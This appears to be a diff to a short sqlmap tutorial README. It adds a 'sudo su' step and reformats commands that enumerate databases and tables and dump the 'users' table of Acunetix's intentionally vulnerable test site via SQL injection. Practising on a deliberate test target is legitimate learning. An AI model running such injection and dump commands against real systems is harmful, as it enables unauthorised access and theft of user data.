@@ -20,20 +20,28 @@ To get a list of all options and switches use:
 
     python sqlmap.py -hh
 
+Enter Root:
+---
+To enter sudo enter the code and enter password:
+
+    sudo su
+
 Web App
 ---
-http://testphp.vulnweb.com/listproducts.php?cat=1
+Copy the url and open in web browser:
+
+    http://testphp.vulnweb.com/listproducts.php?cat=1
 
 Code
 ---
-   sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --batch --dbs 
+To get details of the database:
 
-To open database(acuart database name):
+    sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --batch --dbs
 
-   sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --batch -D acuart --tables --dbs 
+To open database(acurat is a database name):
 
+    sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --batch -D acuart --tables --dbs
 
 To get details of the table:
 
-   sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --batch -D acuart -T users -columns --dump
-
+    sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --batch -D acuart -T users -columns --dump
